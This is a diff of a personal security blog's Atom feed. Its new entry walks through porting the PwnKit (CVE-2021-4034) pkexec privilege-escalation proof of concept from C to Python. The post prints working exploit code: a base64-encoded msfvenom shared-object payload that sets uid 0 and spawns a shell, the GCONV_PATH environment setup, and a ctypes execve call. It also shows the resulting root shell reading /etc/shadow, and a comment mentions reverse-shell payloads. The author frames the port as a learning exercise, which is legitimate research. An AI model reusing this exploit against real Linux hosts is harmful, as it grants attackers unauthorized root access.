@@ -1,4 +1,139 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://ammond.org/feed.xml" rel="self" type="application/atom+xml" /><link href="https://ammond.org/" rel="alternate" type="text/html" /><updated>2022-01-23T11:18:28-06:00</updated><id>https://ammond.org/feed.xml</id><title type="html">joe ammond (pugpug’s) stuff</title><subtitle>joe ammond's musings, write ups, Hack The Box walkthroughs, CTF info</subtitle><entry><title type="html">Writeup for the Hack The Box machine ‘Forge’</title><link href="https://ammond.org/writeup/hackthebox/2022/01/23/HTB-Forge-writeup.html" rel="alternate" type="text/html" title="Writeup for the Hack The Box machine ‘Forge’" /><published>2022-01-23T11:00:00-06:00</published><updated>2022-01-23T11:00:00-06:00</updated><id>https://ammond.org/writeup/hackthebox/2022/01/23/HTB-Forge-writeup</id><content type="html" xml:base="https://ammond.org/writeup/hackthebox/2022/01/23/HTB-Forge-writeup.html">&lt;p&gt;My writeup for the &lt;a href=&quot;https://hackthebox.eu&quot;&gt;HackTheBox&lt;/a&gt; machine 
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://ammond.org/feed.xml" rel="self" type="application/atom+xml" /><link href="https://ammond.org/" rel="alternate" type="text/html" /><updated>2022-01-26T15:24:24-06:00</updated><id>https://ammond.org/feed.xml</id><title type="html">joe ammond (pugpug’s) stuff</title><subtitle>joe ammond's musings, write ups, Hack The Box walkthroughs, CTF info</subtitle><entry><title type="html">Converting a PoC for CVE-2021-4034 from C to Python</title><link href="https://ammond.org/python/2022/01/26/CVE-2021-4034-in-Python.html" rel="alternate" type="text/html" title="Converting a PoC for CVE-2021-4034 from C to Python" /><published>2022-01-26T13:00:00-06:00</published><updated>2022-01-26T13:00:00-06:00</updated><id>https://ammond.org/python/2022/01/26/CVE-2021-4034-in-Python</id><content type="html" xml:base="https://ammond.org/python/2022/01/26/CVE-2021-4034-in-Python.html">&lt;p&gt;On 2022-01-25, &lt;a href=&quot;https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034&quot;&gt;Qualys dropped a 0-day local privilege escalation
+vulnerability&lt;/a&gt;
+in polkit’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pkexec&lt;/code&gt; that allowed a local user to escalate to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; easily.
+&lt;a href=&quot;https://twitter.com/bl4sty&quot;&gt;blasty&lt;/a&gt; posted &lt;a href=&quot;https://haxx.in/files/blasty-vs-pkexec.c&quot;&gt;PoC code&lt;/a&gt;
+that evening. For my own learning and as an interesting exercise, I ported it
+to Python. The payload is generated with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt;, but the rest of the exploit
+code is pure Python. Due to limitations in Python’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os.execve()&lt;/code&gt; function, we
+do need to drop directly into the C library to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pkexec&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The code is available &lt;a href=&quot;https://github.com/joeammond/CVE-2021-4034&quot;&gt;on my GitHub&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;pythons-osexecve-function&quot;&gt;Python’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os.execve()&lt;/code&gt; function&lt;/h2&gt;
+
+&lt;p&gt;One key factor in the exploit working is in how the Linux &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve()&lt;/code&gt; call handles
+when passed &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argv=NULL&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;envp=NULL&lt;/code&gt;. From &lt;a href=&quot;https://man7.org/linux/man-pages/man2/execve.2.html#NOTES&quot;&gt;https://man7.org/linux/man-pages/man2/execve.2.html#NOTES&lt;/a&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;On Linux, argv and envp can be specified as NULL.  In both cases,
+this has the same effect as specifying the argument as a pointer
+to a list containing a single null pointer.  Do not take
+advantage of this nonstandard and nonportable misfeature!  On
+many other UNIX systems, specifying argv as NULL will result in
+an error (EFAULT).  Some other UNIX systems treat the envp==NULL
+case the same as Linux.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;a href=&quot;https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt&quot;&gt;Qualys writeup of the vulnerability&lt;/a&gt;
+details how calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pkexec&lt;/code&gt; with an argument list of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt; causes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pkexec&lt;/code&gt; to
+overwrite a portion of it’s environment, allowing an attacker to introduce 
+an potentially insecure environment variable back into the process. Unfortunately,
+Python’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os.execve()&lt;/code&gt; function doesn’t allow a process to be executed with an argument
+list of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;p5550$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python
+&lt;span class=&quot;go&quot;&gt;Python 3.10.2 (main, Jan 24 2022, 20:21:50) [GCC 11.2.0] on linux
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; import os
+&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; os.execve&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/usr/bin/pkexec'&lt;/span&gt;, None, os.environ&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;Traceback (most recent call last):
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  File &quot;&amp;lt;stdin&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, line 1, in &amp;lt;module&amp;gt;
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;TypeError: execve: argv must be a tuple or list
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; os.execve&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/usr/bin/pkexec'&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;, os.environ&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;Traceback (most recent call last):
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  File &quot;&amp;lt;stdin&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, line 1, in &amp;lt;module&amp;gt;
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;ValueError: execve: argv must not be empty
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Attempting to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve()&lt;/code&gt; with either an empty tuple or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Null&lt;/code&gt; cause exceptions.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-exploit-code&quot;&gt;The exploit code&lt;/h2&gt;
+
+&lt;p&gt;To facilitate using different payloads with the script, I used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; to 
+generate the shared library needed to perform the actual exploit. Using this path
+allows an attacker to drop in different payloads depending on their needs at
+the time. The default exploit calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setuid(0)&lt;/code&gt;, then spans &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Payload, base64 encoded ELF shared object. Generate with:
+#
+# msfvenom -p linux/x64/exec -f elf-so PrependSetuid=true | base64
+#
+# The PrependSetuid=true is important, without it you'll just get
+# a shell as the user and not root.
+#
+# Should work with any msfvenom payload, tested with linux/x64/exec
+# and linux/x64/shell_reverse_tcp
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload_b64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'''
+f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAAC
+AEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAArwEAAAAAAADMAQAAAAAAAAAQ
+AAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAA
+AAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAA
+AAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAA
+AACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAASDH/amlYDwVIuC9iaW4vc2gAmVBUX1JeajtYDwU=
+'''&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload_b64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We also need the environment array to pass to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve()&lt;/code&gt;:
+we start with a list of Python strings, then convert them into a C array of char*.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Set the environment for the call to execve()
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;environ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+        &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'exploit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'PATH=GCONV_PATH=.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'LC_MESSAGES=en_US.UTF-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'XAUTHORITY=../LOL'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Convert the environment to an array of char*
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;environ_p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_char_p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;environ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;environ_p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;environ&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; directly, we open the C library using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctypes&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CDDL&lt;/code&gt; function:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Find the C library to call execve() directly, as Python helpfully doesn't
+# allow us to call execve() with no arguments.
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CDLL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find_library&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'c'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[!] Unable to find the C library, wtf?'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt; argument list and the environment array we built earlier:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Call execve() with NULL arguments
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/usr/bin/pkexec'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_char_p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;environ_p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And we get a root shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;p5550$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python CVE-2021-4034.py
+&lt;span class=&quot;go&quot;&gt;[+] Creating shared library for exploit code.
+[+] Calling execve()
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;uid=0(root) gid=1000(jra) groups=1000(jra),4(adm),27(sudo),119(lpadmin),998(lxd)
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;root
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; /etc/shadow
+&lt;span class=&quot;go&quot;&gt;root:*:18709:0:99999:7:::
+daemon:*:18709:0:99999:7:::
+bin:*:18709:0:99999:7:::
+sys:*:18709:0:99999:7:::
+sync:*:18709:0:99999:7:::
+games:*:18709:0:99999:7:::
+man:*:18709:0:99999:7:::
+lp:*:18709:0:99999:7:::
+mail:*:18709:0:99999:7:::
+news:*:18709:0:99999:7:::
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="python" /><summary type="html">On 2022-01-25, Qualys dropped a 0-day local privilege escalation vulnerability in polkit’s pkexec that allowed a local user to escalate to root easily. blasty posted PoC code that evening. For my own learning and as an interesting exercise, I ported it to Python. The payload is generated with msfvenom, but the rest of the exploit code is pure Python. Due to limitations in Python’s os.execve() function, we do need to drop directly into the C library to call pkexec.</summary></entry><entry><title type="html">Writeup for the Hack The Box machine ‘Forge’</title><link href="https://ammond.org/writeup/hackthebox/2022/01/23/HTB-Forge-writeup.html" rel="alternate" type="text/html" title="Writeup for the Hack The Box machine ‘Forge’" /><published>2022-01-23T11:00:00-06:00</published><updated>2022-01-23T11:00:00-06:00</updated><id>https://ammond.org/writeup/hackthebox/2022/01/23/HTB-Forge-writeup</id><content type="html" xml:base="https://ammond.org/writeup/hackthebox/2022/01/23/HTB-Forge-writeup.html">&lt;p&gt;My writeup for the &lt;a href=&quot;https://hackthebox.eu&quot;&gt;HackTheBox&lt;/a&gt; machine 
 &lt;a href=&quot;https://app.hackthebox.com/machines/Forge&quot;&gt;Forge&lt;/a&gt; is up, read
 it &lt;a href=&quot;https://ammond.org/writeups/htb/machines/Forge&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="writeup" /><category term="hackthebox" /><summary type="html">My writeup for the HackTheBox machine Forge is up, read it here.</summary></entry><entry><title type="html">Writeup for ‘Objective 10’ of the 2021 SANS Holiday Hack Challenge</title><link href="https://ammond.org/writeup/2022/01/08/SANS-HHC-2021.html" rel="alternate" type="text/html" title="Writeup for ‘Objective 10’ of the 2021 SANS Holiday Hack Challenge" /><published>2022-01-08T07:00:00-06:00</published><updated>2022-01-08T07:00:00-06:00</updated><id>https://ammond.org/writeup/2022/01/08/SANS-HHC-2021</id><content type="html" xml:base="https://ammond.org/writeup/2022/01/08/SANS-HHC-2021.html">&lt;p&gt;My writeup for ‘Objective 10’ is &lt;a href=&quot;https://ammond.org/writeups/SANS/HHC-2021&quot;&gt;published&lt;/a&gt;. I took
 a different route this year and didn’t cover every Objective, but instead
